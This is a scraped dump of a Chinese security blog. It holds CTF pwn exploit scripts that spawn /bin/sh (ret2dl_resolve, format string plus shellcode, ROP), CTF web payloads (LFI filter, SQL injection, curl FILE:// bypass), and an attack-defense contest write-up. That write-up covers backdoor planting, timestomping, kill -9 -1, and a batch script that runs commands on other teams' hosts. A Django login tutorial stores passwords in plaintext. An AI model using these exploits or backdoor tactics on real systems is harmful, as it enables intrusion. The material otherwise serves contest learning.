u16(ELF_obj.read(versym+fake_sym*2,2)) if fake_ndx != 0: fake_sym+=1 len_bypass_version+=0x10 continue else: break if do_slim: slim = len_bypass_version - len_bypass_version%8 version = len_bypass_version%8 resolve_data,resolve_call=ret2dl_resolve(ELF_obj,func_name,resolve_addr,fake_stage+slim,0) return (resolve_data,resolve_call,fake_stage+slim) fake_r_info = fake_sym&lt;&lt;8|0x7 reloc_offset=fake_stage-jmprel resolve_data = p32(resolve_addr)+p32(fake_r_info)+func_name+'\\x00' resolve_data += 'a'*len_bypass_version resolve_data += p32(p_name)+p32(0)+p32(0)+p32(0x12) resolve_call = p32(plt0)+p32(reloc_offset) return (resolve_data,resolve_call)offset = 0x4cstage = binary.bss()p_ebx_ret = 0x080482c9p3ret = 0x080484a9dl_data,dl_call,stage = ret2dl_resolve(binary,'system',binary.bss()+0x200,stage)pay = 'a'*offsetpay += p32(binary.plt['read'])+p32(p3ret)+p32(0)+p32(stage)+p32(len(dl_data)+8) #读40个字节到base_stagepay += dl_call pay += p32(p_ebx_ret)+p32(stage+len(dl_data)) #伪造条目p.sendline(pay)sleep(1)p.send(dl_data+'/bin/sh\\x00')#调用systemp.interactive() 也可用roputils简化脚本 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#coding:utf-8import sysimport roputilsfrom pwn import *# context.log_level = 'debug'p = process(\"./baby_stack\")elf = ELF(\"./baby_stack\")rop = roputils.ROP('./baby_stack')stage = rop.section('.bss')offset = 0x4cvulFunc = 0x804840bbuf1 = 'A' * offsetbuf1 += p32(elf.symbols['read']) + p32(vulFunc) + p32(0) + p32(stage) + p32(100) p.send(buf1)buf2 = rop.string('/bin/sh')buf2 += rop.fill(20, buf2)buf2 += rop.dl_resolve_data(stage+20, 'system')buf2 += rop.fill(100, buf2)p.send(buf2)buf3 = \"A\"*offset + rop.dl_resolve_call(stage+20,stage)p.send(buf3)p.interactive()#coding:utf-8import sysimport roputilsfrom pwn import *# context.log_level = 'debug'p = process(\"./baby_stack\")elf = ELF(\"./baby_stack\")rop = roputils.ROP('./baby_stack')stage = rop.section('.bss')offset = 0x4cvulFunc = 0x804840bbuf1 = 'A' * offsetbuf1 += p32(elf.symbols['read']) + p32(vulFunc) + p32(0) + p32(stage) + p32(100)p.send(buf1)buf2 = rop.string('/bin/sh')buf2 += rop.fill(20, buf2)buf2 += rop.dl_resolve_data(stage+20, 'system')buf2 += rop.fill(100, buf2)p.send(buf2)buf3 = \"A\"*offset + rop.dl_resolve_call(stage+20,stage)p.send(buf3)p.interactive() dragon_game 12345678910111213141516171819from pwn import *# context.log_level = 'debug'p = process(\"./DragonGame\")p.recvuntil(\"secret[0] is \")addr = int(p.recvuntil(\"\\n\")[:-1],16)log.success(\"addr:\"+hex(addr))p.sendlineafter(\"west?:\\n\",\"east\")p.sendlineafter(\"address'\\n\",str(addr))pause()p.sendlineafter(\" is:\\n\",\"%233c%7$n\") #修改check[0]=233shellcode = \"\\x6a\\x3b\\x58\\x99\\x52\\x48\\xbb\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x53\\x54\\x5f\\x52\\x57\\x54\\x5e\\x0f\\x05\" #Linux/x64 Execute /bin/sh Shellcodep.sendlineafter(\"SPELL\\n\", shellcode) p.interactive() easy_rop 通过__libc_csu_init()函数来构造gadgets 通过设置eax为59调用execve(‘/bin/sh’,NULL,NULL) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758from pwn import *import timep = process(\"./easy_rop\")elf = ELF(\"./easy_rop\")syscall_addr = 0x400582rop_addr1 = 0x4005fa #&lt;__libc_csu_init+90&gt;rop_addr2 = 0x4005e0 #&lt;__libc_csu_init+64&gt;bss_addr = 0x601040offset = 0x18#在bss段写入/bin/sh和syscall的地址rop = \"\"rop += offset*\"A\"rop += p64(rop_addr1)rop += p64(0) #rbxrop += p64(1) #rbprop += p64(elf.got['read']) #r12rop += p64(0x20) #r13 #rdxrop += p64(bss_addr) #r14 #rsirop += p64(0) #r15 #rdirop += p64(rop_addr2) #ret #read(0, bss_addr, 0x20)#设置eax为59rop += p64(0)rop += p64(0) #rbxrop += p64(1) #rbprop += p64(elf.got['read']) #r12rop += p64(0x40) #r13 #rdxrop += p64(bss_addr+ 0x10) #r14 #rsirop += p64(0x0) #r15 #rdirop += p64(rop_addr2) #ret #read(0, bss_addr+0x10, 0x40)#execve('/bin/sh', NULL, NULL)rop += p64(0)rop += p64(0)rop += p64(1)rop += p64(bss_addr + 8) #syscallrop += p64(0) #NULLrop += p64(0) #NULLrop += p64(bss_addr) #'/bin/sh'rop += p64(rop_addr2) #execve('/bin/sh', NULL, NULL)sleep(2)p.sendline(rop)#第一次readsleep(1)p.send((\"/bin/sh\\x00\"+p64(syscall_addr)).ljust(0x20,'\\x00'))#第二次readsleep(1)p.send(\"A\"*59)sleep(1)p.interactive() login 存在整数溢出，passwd可以输入409长度，当输入大于260长度时也可符合判定，跳到特定函数即可拿flag 123456789101112131415from pwn import *p = process(\"./login\")p.sendlineafter(\"choice:\",\"1\")p.sendlineafter(\"username:\\n\",\"\")offset = 24payload = \"A\"*offsetpayload += p32(0x804868b)payload = payload.ljust(261,\"A\")p.sendlineafter(\"passwd:\\n\",payload)print p.recvall()","categories":[{"name":"比赛","slug":"比赛","permalink":"https://www.xjseck.com/categories/比赛/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://www.xjseck.com/tags/CTF/"},{"name":"比赛","slug":"比赛","permalink":"https://www.xjseck.com/tags/比赛/"}]},{"title":"首届新疆网络安全知识技能竞赛(个人赛)","slug":"首届新疆网络安全知识技能竞赛(个人赛)","date":"2018-09-12T14:56:43.000Z","updated":"2018-09-14T06:30:57.689Z","comments":true,"path":"2018/09/12/首届新疆网络安全知识技能竞赛(个人赛)/","link":"","permalink":"https://www.xjseck.com/2018/09/12/首届新疆网络安全知识技能竞赛(个人赛)/","excerpt":"","text":"前言这次比赛也算是一个疆内CTF比赛的一个摸底，将会今后疆内比赛发展的一个趋势，此次参加比赛的团体有来自全国各地的64个团体、137名个人，共329名选手参赛。为期三天的比赛，也算是走过了全程，前两天的个人和团体的刷题晋级赛和第三天的个人和团体的攻防赛，我带的两个队伍双双都挺进了决赛，最后选择两个人决赛和两个队伍的团体决赛的模式，完成了此次比赛。之前也是立了一个FLAG，就是疆内的比赛我们绝对要拼尽全力，也必须在疆内的高校队伍中排上前两名，这次也算是完成了这个flag，最终挺进决赛的高校队伍也就只剩下新疆师范大学-大象安全和大象与安全队伍了。为了这次比赛我们做了一个赛后的详细的复盘，包括攻防赛。 个人刷题晋级赛个人赛期间比较蛇皮，状态什么的没有调整好，赛前 还给别人进行培训，结果参赛时，什么都不会，一些客观原因，导致比赛也不是很顺利，搞了两个选手的shell，导致很蛇皮。这里就复盘隐写、密码和web题目 misc题解 躲猫猫拿到题目，发现是png文件，但是不行正常浏览图片，查看属性发现1M多，应该是包含了其他内容，使用binwalk发现，发现文件是从pdf文件格式开始的，我们可以尝试修改文件的后缀名为PDF（一般文件预浏览的话都是从文件内容格式的最开始的文件格式进行的），可以正常浏览，然后ctrl+a全选是否有隐藏的文字坑点 使用foremost 等工具解压出来的文件，也会有一个pdf，但是ctrl+a发现是一个假的flag 第8号常规的过一遍stegsolve和binwalk没有发现什么问题，那就手动浏览一下十六进制，图片是jpeg，一ff 8d 开始，应该是ff 9d 结束，发现后面隐藏的有数据信息，foremost 也没提取到什么信息，就手动提取一下十六进制，导出文件。应该是“当铺密码” 然后我们把 大量出现的数字46、63、33转字符搜索一下 发现时0ok！解密https://www.splitbrain.org/services/ookflag{0ok_1_Ook} task_give_you_flag 一个gif文件，使用stegsolve浏览每一帧的图片信息，最后一帧出现一个二维码的图片，发现缺3个角，那就找一个完整的二维码，补一下角。 流量包解密01直接使用aircrack-ng 爆破，发现在跑IV，说明就是wpe加密的握手包，密码为[ 42:43:31:33:46 ] (ASCII: BC13F ) 直接wireshark进行解密浏览一下 http 协议最后发现妈耶最后发现，这个不是就是国赛出题的师傅吗，当时还私聊进行过交流，结果还是败给师傅了。:)太强了 Web题解 LFI123456789&lt;?php $file = isset($_GET['file']) ? $_GET['file'] : NULL; if(stripos($file, 'flag.php') !== false &amp;&amp; stripos($file, 'base64') === false) &#123; include($file); &#125; else &#123; echo 'flag.php 中有你想要的'; &#125; highlight_file(__FILE__);?&gt; stripos函数是二进制安全目前没有办法绕过，只能考虑替换base64功能的过滤器进行文件的编码读取参考https://lorexxar.cn/2016/09/14/php-wei/最后payload ：file=php://filter/read=string.rot13/resource=flag.php ezsqli手工测试，发现是回现注入，过滤的关键字比较多，大概测试了，过滤了information和flag字段，这样就卡死了不能使用union select from通过mysql的内置数据库查询数据了，手工大致猜测了一下数据库和表和字段http://10.98.98.25:5551/index.php?id=-1&#39; union select 1,database(),3 || &#39;1&#39;=&#39;1ctf 数据库 info 表 字段 phone username password email感觉有点类似ddctf的过滤字段名的注入最后本地测试了一下源表中的数据12345678910111213141516171819+----+----------+------------+---------------------+| id | username | password | flag |+----+----------+------------+---------------------+| 1 | Dumb | Dumb | NULL || 2 | Angelina | I-kill-you | NULL || 3 | Dummy | p@ssword | xjnu&#123;ctf-is-there!&#125; || 4 | secure | crappy | NULL || 5 | stupid | stupidity | NULL || 6 | superman | genious | NULL || 7 | batman | mob!le | NULL || 8 | admin | 2122 | NULL || 9 | 0 | 0 | NULL || 10 | seck | test | NULL || 11 | seck | test | NULL || 20 | 114 | 123456 | 2332 || 21 | 0 | 123456 | 2332 || 22 | 1 | 123456 | 2332 |+----+----------+------------+---------------------+14 rows in set (0.00 sec) Curl访问题目出现一个输入框，随便填上一些地址，发现有waf，当时测试发现是ip的10进制可以进行访问，然后爆破了一波端口，发现就3306端口开着，一直没有办法，考点应该是通过伪协议进行文件的读取，但是发现file、http、等协议被过滤，当时没有想到是绕过这两个关键字，赛后才知道是file协议的大写绕过，直接读flag文件:payload:curl=FILE:///flag sha1这个很常见的php的一些加密函数不能处理数组，如md5、sha1 密码题 mystical_signc2p9eWJfZ25hbHZ0X2Jfe2xoZ2JuX3JsdA==解密出来sj}yb_gnalvt_b_{lhgbn_rlt 看起来比较想栅栏加密，然后进行 栅栏解密http://ctf.ssleye.com/railfence.htmlsynt{blnl_abj_lbh_trg_vg}然后进行凯撒偏移flag{oyay_now_you_get_it}这道题应该和sctf的签到题差不多。 task_simple_RSA 1234567小明得到了一个RSA加密信息，你能帮他解开吗？c=27990707239527629138352696377606718299992092729307910015562504696905353450041n=41069065654959614597750207738698085798765257876378561837894254544512565197793e=11 题目直接给了n、c、e，那我们可以对n进行分解出p和qp = 218538667198531171522213512860093810267 q = 1879258539526576075126178655025354801791234567891011121314151617181920import gmpyfrom Crypto.PublicKey import RSAn = 41069065654959614597750207738698085798765257876378561837894254544512565197793c = 27990707239527629138352696377606718299992092729307910015562504696905353450041e = long(11)p = 218538667198531171522213512860093810267q = 187925853952657607512617865502535480179d = long(gmpy.invert(e,(p-1)*(q-1)))key = RSA.construct((n,e,d))print keyprint key.decrypt(c)print hex(key.decrypt(c))print hex(key.decrypt(c))[2:-1].decode('hex') flag为：ABCEF!th1s_was_very_hot_outside!","categories":[{"name":"比赛","slug":"比赛","permalink":"https://www.xjseck.com/categories/比赛/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://www.xjseck.com/tags/CTF/"},{"name":"攻防","slug":"攻防","permalink":"https://www.xjseck.com/tags/攻防/"}]},{"title":"从头开始SRC漏洞挖掘","slug":"从头开始SRC漏洞挖掘","date":"2018-07-16T02:24:58.000Z","updated":"2018-09-05T15:19:46.496Z","comments":true,"path":"2018/07/16/从头开始SRC漏洞挖掘/","link":"","permalink":"https://www.xjseck.com/2018/07/16/从头开始SRC漏洞挖掘/","excerpt":"","text":"前言这段时间学习的东西比较积淀，想构造自己批量检测漏洞的工具，也是怕自己积攒的漏洞姿势不够，所以就疯狂的开始整理漏洞的利用方式。大致从Top10漏洞和常见的应用漏洞整理开始。大致整理 SRC案例学习，主要参考web-hacking-101、论坛Paper和一些Wooyun案例 分析一下各个挖洞大佬们提交的漏洞情况，一般有批量的嫌疑，但是最多的还是细节+手工 漏洞复现，积攒漏洞量和自己的敏感性 渗透测试经验补充和CTF刷题 立一个FLag 争取完善一下Top10的漏洞利用姿势 渗透测试Bypass姿势提升 批量脚本的编写和自动化的实现","categories":[{"name":"SRC","slug":"SRC","permalink":"https://www.xjseck.com/categories/SRC/"}],"tags":[{"name":"SRC","slug":"SRC","permalink":"https://www.xjseck.com/tags/SRC/"},{"name":"漏洞","slug":"漏洞","permalink":"https://www.xjseck.com/tags/漏洞/"}]},{"title":"6月9新警-易霖博杯网络安全技能大赛","slug":"6月9新警-易霖博杯网络安全技能大赛","date":"2018-06-11T07:30:32.000Z","updated":"2018-09-14T05:52:41.557Z","comments":true,"path":"2018/06/11/6月9新警-易霖博杯网络安全技能大赛/","link":"","permalink":"https://www.xjseck.com/2018/06/11/6月9新警-易霖博杯网络安全技能大赛/","excerpt":"","text":"描述 这次比赛从最初的想法提出应该是从5月初，警察学院的曹兄和我聊的时候，就想为上学期间交一份不枉此行的答卷，也为自己后续的学弟学妹们开阔一下学习交流的空间。本想是做一个内部交流的友谊赛，但是后面的决策，都是一些大佬说的算，最后也就是促成6月9号最终的比赛形式了，后面有机会还是想搞一个比较传统的CTF比赛，从线上到线下，自主命题线上和线下题目。CTF和Web渗透测试也算是玩的比较久的，现成的题目也积累了相对比较多，这一方面有感兴趣的小伙伴可以私下交流一下，具体的题目资源和本学校的信息安全协会都会有相应的介绍，关于CTF比赛WEB解题的模式，可以参考github上面的内容 github最后贴上几个图片吧。 题目wp 首先拿到题目，就比较懵逼，这比赛的感觉就不吐槽了，上来就是web版的ssh 才可以使用，只能一个人进行操作。 两个Web服务器，配搭着各种服务和漏洞。server1 root用户，web目录文件也是root，所以这个很蛇皮。Server2 admin用户，Web 目录文件也是admin组，这个还可以，文件权限都是777。 根据以往比赛经验来看，大致的思路我这里贴一下，后面再介绍此次比赛所用到的姿势。 1、备份。源码以及数据库，可以备份到隐蔽的目录（.xx）下，顺便down到本地（Win下：Winscp，FileZilla；Mac：scp，Transmit..）；2、扫描后门。有的比赛主办方留有后门，利用安全狗、D盾这类软件来扫描源码，快速定位并利用；或者利用seay的代码审计工具也可快速扫描到后门；3、弱口令。绝大多数情况下，所有队伍的Web后台、phpmyadmin等服务的管理密码都一样，快速修改自己密码（无关紧要的可直接mv来改名）并利用；4、自写敏感功能。主办方可能已经把CMS本身的漏洞补全了，并自写了一些敏感功能，如上传、包含界面..，这时候需要自己手动去发现（利用seay代码审计工具可快速定位、ls -t按修改时间来看最新被修改的文件），分析，删除，利用；5、监测文件上传时间可快速发现他人shell，并加以利用。我们上传的shell也可以修改文件时间来加强混淆，touch -r 目的 源；6、不要想办法提权，费时费力不讨好，给root的主办方都是假的；7、开一台ssh只做一件事，tail -f *.log，看日志，不言而喻，抓他们的payload并利用；8、CMS补漏洞没必要按着网上的一步一步修改源码来改，如果是一些无关紧要的功能，直接mv改名，大多数主办方只是check服务是否能正常运行；9、shell使用外部接受参数进行命令调用，多POST；10、权限维持很多方法，如果被种上都很恶心，不过如果挂上waf（禁止文件上传，执行任何命令均返回假flag，发现敏感字段直接exit [过滤都是假的]，…）这些都是浮云，手速还是最重要的；11、为了避免自己上传的shell都一样而被别人利用于其他服务器，可以采用md5等hash来命名文件名（避免，太扎眼）或者密码；12、如果被挂上内存马，并且没有权限来restart apache2下，完全可以直接在shell中（www-data 权限）下 kill -9 -1 杀死所有子进程（杀死当前用户所有进程，有权限下慎用），也可以直接killall apache2。这种操作并不会kill掉apache主进程，因为内存马是Apache启动的一个子进程；13、同12，要注意守护进程的文件，这个才是最恶心的；线下赛最重要的是文件、流量的监控和自身修补的防御，一人兼职边防边打往往会失去好多分 这次题目的分析 这里多说一句，涉及的工具和资源文件，可以参考我博客(xjseck.com)上的文章 和github上的资源文件 一、 上来备份文件，Web版的ssh，所以这里我直接给我的web都植入了一个一句话后门，使用#tar -cvf /tmp/web1.rar /var/www/html ，然后使用菜刀进行下载就好了二、 进行D盾或者我github上写好的scanshell.py 进行后门的扫描web1的扫描结果web2的扫描结果到这里的时候，队友就可以补上了，我们就很快速的写好了一个简单的批量脚本了，首轮就开始了进行手动提交flag了。 12345678910111213141516# coding:utf-8import requestsimport reflag = []ip = [1, 2, 3, 5, 6, 7, 8]# 105for i in ip: try: url = \"http://172.20.10\" + str(i) + \".101\" + \"/index.php\" print url post = &#123;'aa': 'system(\\\"cat /flaginfo.txt\\\");'&#125; a = requests.post(url, data=post, timeout=2) if a.status_code == 200: print a.text[:32] except: pass 其他的shell类推一下，只要针对能取得所有的队伍flag就ok了，因为flag刷新也就那么几轮，所以也就没有写自动化提交flag的脚本了。大多数时间，是在看神仙们打架。 三、 队友手动上的waf文件的时候少写了一个字母导致，丢失了20分，后面大家的访问日志就正常保存了。 四、 题目漏洞汇总 1234567891011121314151617181920工具扫描的shell是几个问题。分析源代码的漏洞大致有一下几点，都是手动构造的漏洞。1. web1/about.php?f=../../../../../../../../../../../flaginfo.txt2. web1/reg.php?a=system(&apos;cat /flaginfo.txt&apos;);3. web1/index.php?123=system(&apos;cat /flaginfo.txt&apos;);4. web1/message.php?id=1 union select 1,2,group_concat(user_name),4 from users--+ 注入后台用户名，mysql5.7 不能读文件好气。进入后台,user.php&lt;?php system(&quot;cat /root/flag.txt&quot;);?&gt;其实主办方的意思是，登录后台就能显示flag内容的，但是flag文件确实flaginfo.txt,就问你是蛇皮的吧。5. 最后阶段的时候丢了40分，突然就明白过来，不仅限于web服务，后面发现vsftp服务，直接允许匿名用户登录，映射的目录是根目录，直接可以刷一波 ftp://172.20.108.101/flaginfo.txt6. web1 mysql 可以进行远程登录 mysql -h -uroot -p123 进行任意队伍的web1数据库的ctf删除掉，迫使主办方进行重置，刷分。7. web1 后台的任意文件上传 POST /user/upload.php images/1528712524shell.php 访问web1/images/1528712524.php 8. web2/index.php?aa=system(&apos;cat /flaginfo.txt&apos;);9. web2/footer.php POST shell=cat /flaginfo.txt10. web2/config.php?c=system(&apos;cat /flaginfo.txt&apos;);11. web2/.a.php?c=system(&apos;cat /flaginfo.txt&apos;);12. web2/a.php?c=system(&apos;cat /flaginfo.txt&apos;);13. search.php?id=1 SQLMAP 跑后台密码，登录出flag 但是 又蛇皮14. 登录后有任意文件上传 web2 的详细wp可以参考主办方提供的wp，上传到了github上了。 防护 从上面的思路就可以知道，只要你发现了问题，才能比较好的进行修补，这次的比赛，也就是没有check文件，进行后台动态监控，选手的操作，主办方都不知道，哈哈哈，很蛇皮的吧。要是正常一点的话，就是web服务器一旦文件丢失或者web服务器不能访问，都会被扣分。网站的文件不多，都是能一眼可以看出问题的，手工都可以删改的吧。可能有队伍发现了，我们队伍使用的waf，哈哈，贴几个waf 防护的图片。 花絮 这次的比赛没有使用写好的专门的脚本，进行批量植入内存马，主要是给了root权限，和满地的shell，也就没有必要了。希望后面赛事的提高再使用吧。后面分析日志文件，发现有的队伍竟然使用web目录扫描工具，我就觉的很蛇皮，明明大家的都一样，为毛使用扫描工具呢，日志量还不是一般的大，发现是108,107,103的队伍进行扫描的，只能说大佬们的套路多:)师傅们不要打我！早知道写一个策略好了，哈哈。最后感谢大象安全公司，为我们此次的比赛保驾护航！","categories":[{"name":"CTF","slug":"CTF","permalink":"https://www.xjseck.com/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://www.xjseck.com/tags/CTF/"},{"name":"攻防竞赛","slug":"攻防竞赛","permalink":"https://www.xjseck.com/tags/攻防竞赛/"}]},{"title":"Django学习笔记(四)","slug":"Django学习笔记-四","date":"2018-02-09T16:40:27.000Z","updated":"2018-09-14T06:05:47.558Z","comments":true,"path":"2018/02/10/Django学习笔记-四/","link":"","permalink":"https://www.xjseck.com/2018/02/10/Django学习笔记-四/","excerpt":"","text":"前言上两篇我们学习了MVT和Models进行数据库的操作，这一篇我们还是以实例来讲解，主要学习使用Django 编写一个 注册、登录、验证码的例子。 我们将学到如下知识： Django forms表单样式排版 验证码实现的机制 cookies session 设置 Django request对象传值 Django 自带的用户登录判断 例子快速上手还是多动手敲打键盘编写代码，多动手实现。直接上学例子学习，主要是先建立Django实现功能的思想，里面的细枝末节可以搜索一下相关的资料进行补充巩固学习。这里介绍两种编写的方法，一种是自己设计用户登录注销管理cookies和session。另一种就是使用Django自带判断登录 注销等 例子四（1）验证码的部分参考https://strcpy.me/index.php/archives/176/每次获取的验证码都需要把上次生成的验证码消除。准备工作以后准备工作都是相同的，设置方面也是一直的。12345678910111213141516171819202122232425262728293031323334353637$python-admin startproject project #创建项目$python manage.py startapp blog #创建应用#设置数据库、应用加载、模板文件路径DATABASES = &#123; 'default': &#123; 'ENGINE': 'django.db.backends.mysql', 'NAME': 'django-test', 'USER': 'root', 'PASSWORD': 'seck@root...', 'HOST': '127.0.0.1', 'PORT': '3306', &#125;&#125;INSTALLED_APPS = ( 'django.contrib.admin', 'django.contrib.auth', 'django.contrib.contenttypes', 'django.contrib.sessions', 'django.contrib.messages', 'django.contrib.staticfiles', 'blog',)TEMPLATES = [ &#123; 'BACKEND': 'django.template.backends.django.DjangoTemplates', 'DIRS': [os.path.join(BASE_DIR, 'templates')], 'APP_DIRS': True, 'OPTIONS': &#123; 'context_processors': [ 'django.template.context_processors.debug', 'django.template.context_processors.request', 'django.contrib.auth.context_processors.auth', 'django.contrib.messages.context_processors.messages', ], &#125;, &#125;,] 项目的文件结构如图首先编写models.py 创建数据库表结构12345678910111213141516#!/usr/bin/env python#-*- coding:utf-8 _*-\"\"\"author:secktime: 2018/01/28\"\"\"from django import formsfrom .views import *class UserRegisterForm(forms.Form): username = forms.CharField(label='用户名',max_length=50) password = forms.CharField(label='密码',widget=forms.PasswordInput()) email = forms.EmailField(label='邮箱') # captcha1=captcha()class UserLoginForm(forms.Form): username = forms.CharField(label='用户名', max_length=50) password = forms.CharField(label='密码', widget=forms.PasswordInput()) 编写forms.py 创建类，继承form.Form 页面根据类的对象自动创建html标签 提交，request.POST 封装到类的对象里，obj=UserInfo(request.POST) 用户输入是否合法 obj.is_valid() 全部合法，获取全部内容 obj.clean() 只有有不合法 obj.errors1234567891011121314151617181920#!/usr/bin/env python#-*- coding:utf-8 _*-\"\"\"author:secktime: 2018/01/28\"\"\"from django import formsfrom .views import *class UserRegisterForm(forms.Form): username = forms.CharField( required=True, error_messages=&#123;'required':'用户名不能为空'&#125;, label='用户名',max_length=50,widget=forms.TextInput(attrs=&#123;'placeholder': 'Username','class':'username11'&#125;)) password = forms.CharField(label='密码',widget=forms.PasswordInput()) email = forms.EmailField(label='邮箱') # captcha1=captcha()class UserLoginForm(forms.Form): username = forms.CharField(required=True, error_messages=&#123;'required':'用户名不能为空'&#125;,label='用户名', max_length=50) password = forms.CharField(label='密码', widget=forms.PasswordInput()) attrs属性是定义在html中用户登录框的css属性名称，error_messages 确认输入的是否规范返回错误的信息比如required=True 如果没有填入用户名，就会显示“用户名不能为空”细节参考http://www.cnblogs.com/zhaijunming5/category/892772.htmlhttp://www.cnblogs.com/yangmv/p/5327477.html 编写views.py进行控制数据传送关键点的信息就是使用session控制验证码的验证。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980#coding:utf-8from django.shortcuts import renderfrom django.http import HttpResponse,HttpResponseRedirect ,requestfrom captcha import *from .forms import *from .models import *# Create your views here.#首先显示def index(request): data=[] try: if request.session['username']: seesion=request.session['username'] print seesion if seesion: data.append(seesion) print \"login success!\" except Exception , e: print (e) data.append('no login') title=\"seck\" print request.COOKIES # return HttpResponse(\"&lt;img id='verifycode' src='/captcha/' alt='CheckCode'/&gt;\") return render(request,'blog/index.html',&#123;'title':title,'data':data&#125;,)#验证码调用def captcha(request): Cap = Captcha(request) Code =Cap.display() return Code#注册def register(request): if request.method == 'POST': userform =UserRegisterForm(request.POST) cap = request.POST.get('cap') ca = Captcha(request) if userform.is_valid(): username = userform.cleaned_data['username'] password = userform.cleaned_data['password'] email = userform.cleaned_data['email'] if ca.check(cap): print \"The code true\" else: print \"The code error!\" return HttpResponse(\"验证码不正确,请刷新后重新输入！\") if User.objects.filter(username=username): print \"The user exits\" return HttpResponse(\"用户名重复！\") else: User.objects.create(username=username, password=password, email=email).save() return HttpResponse('register success!') else: userform = UserRegisterForm() return render(request,'blog/register.html',&#123;'userform':userform,&#125;)def login(request): if request.method == \"POST\": userform = UserLoginForm(request.POST) print userform.errors.get('username') if userform.is_valid(): username = userform.cleaned_data['username'] password = userform.cleaned_data['password'] user= User.objects.filter(username__exact=username,password__exact=password) if user: #Step1:生成随机字符串(seesionID) #Step2：通过cookie发送给客户端 #Step3：服务端保存 session print \"seck\" # print user.values()[0][username] request.session['username']=username print request.session # return render(request,'blog/index.html',&#123;'userform':userform&#125;) return HttpResponseRedirect('/') else: return HttpResponse('用户名或者密码错误！') else: print \"stsrat\" userform=UserLoginForm() return render(request,'blog/login.html',&#123;'userform':userform&#125;)def sign_out(request): del request.session['username'] return HttpResponseRedirect('/') urls.py 的设置blog/urls.py1234567891011121314151617#!/usr/bin/env python#-*- coding:utf-8 _*-\"\"\"author:secktime: 2018/01/28\"\"\"from django.conf.urls import include, urlfrom views import *urlpatterns = [ # Examples: # url(r'^$', 'blog_week_6.views.home', name='home'), url(r'^captcha/$',captcha), url(r'^login/$',login), url(r'^register/$',register), url(r'^sign_out/$',sign_out), url(r'', index,name='index'),] 根目录下的urls.py123456789from django.conf.urls import include, urlfrom django.contrib import adminurlpatterns = [ # Examples: # url(r'^$', 'blog_week_8.views.home', name='home'), # url(r'^blog/', include('blog.urls')), url(r'',include('blog.urls')), url(r'^admin/', include(admin.site.urls)),] 模板文件的代码index.html12345678910111213&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;&#123;&#123;title&#125;&#125;&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;welcome &#123;% if data %&#125;&#123;% for data in data%&#125; &#123;% if 'no' not in data %&#125; &#123;&#123;data&#125;&#125; &lt;a href=\"/sign_out/\"&gt;退出&lt;/a&gt; &#123;% endif%&#125; &#123;% endfor %&#125; &#123;% endif %&#125;&lt;/h1&gt;&lt;a href=\"/login/\"&gt;登录 &lt;/a&gt;&lt;br&gt;&lt;a href=\"/register/\"&gt;注册 &lt;/a&gt;&lt;/body&gt;&lt;/html&gt; login.html1234567891011121314151617&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;登录页面&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form method=\"post\" enctype=\"multipart/form-data\"&gt; &#123;% csrf_token %&#125; &#123;&#123;userform&#125;&#125; &lt;input type=\"submit\" name=\"sumit\" value=\"login\"&gt;&lt;/form&gt;&lt;a href=\"/\"&gt;首页 &lt;/a&gt;&lt;br&gt;&lt;a href=\"/register/\"&gt;注册 &lt;/a&gt;&lt;/body&gt;&lt;/html&gt; register.html123456789101112131415161718&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;注册页面&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form method=\"post\" enctype=\"multipart/form-data\"&gt; &#123;% csrf_token %&#125; &#123;&#123;userform&#125;&#125; 验证码 &lt;input type=\"text\" name=\"cap\"&gt; &lt;img src=\"&#123;&#123;'/captcha/'&#125;&#125;\"&gt; &lt;input type=\"submit\" name=\"sumit\" value=\"register\"&gt;&lt;/form&gt;&lt;a href=\"/login/\"&gt;登录 &lt;/a&gt;&lt;br&gt;&lt;a href=\"/\"&gt;首页 &lt;/a&gt;&lt;/body&gt;&lt;/html&gt; 项目代码https://github.com/Huseck/Django-study/tree/Django-study-4本篇的运行结果图 例子四（2） 主要关注的几个逻辑问题 怎么判断用户名是否重名 继承自带的auth.user表是否能添加我们还需要的字段 使用DjangoCaptcha判断机制是否符合要求 forms继承的关系和判断form表单数据 准备 这里我们使用自带的auth_user实现注册、登录验证。 安装pip install django-simple-captcha==0.5.6 配置 settings.py 12345678910INSTALLED_APPS = ( 'django.contrib.admin', 'django.contrib.auth', 'django.contrib.contenttypes', 'django.contrib.sessions', 'django.contrib.messages', 'django.contrib.staticfiles', 'blog', 'captcha',) 根目录下的urls.py也要配置验证码的路由 12345urlpatterns = [ url(r'', include('blog.urls')), url(r'^admin/', include(admin.site.urls)), url(r'^captcha/', include('captcha.urls')),] 之后我们生成默认的数据库，成功之后会发现是有captcha_captchastore表的然后开始编写我们的forms表单，blog目录下创建forms.py文件代码如下: 1234567891011121314151617181920#!/usr/bin/env python#-*- coding:utf-8 _*-\"\"\"author:secktime: 2018/02/09\"\"\"from django import formsfrom captcha.fields import CaptchaFieldfrom django.contrib.auth.forms import UserCreationForm, AuthenticationFormfrom .models import Usersclass CreateUser(UserCreationForm): #UserCreationForm 里面自带的会验证重名 username = forms.CharField(error_messages=&#123;'required':u\"用户名不能为空\"&#125;) password = forms.CharField(widget=forms.PasswordInput(),error_messages=&#123;'required':u\"密码不能为空\"&#125;) email = forms.CharField() captcha = CaptchaField()class Auth(AuthenticationForm): username = forms.CharField(error_messages=&#123;'required': '用户名不能为空'&#125;) password = forms.CharField(widget=forms.PasswordInput(),error_messages=&#123;'required':u\"密码不能为空\"&#125;) captcha = CaptchaField() 我们编写一下视图函数 1234567891011121314151617181920212223242526272829303132333435363738394041#coding:utf-8from django.shortcuts import render,redirectfrom django.http import HttpResponsefrom django.contrib.auth 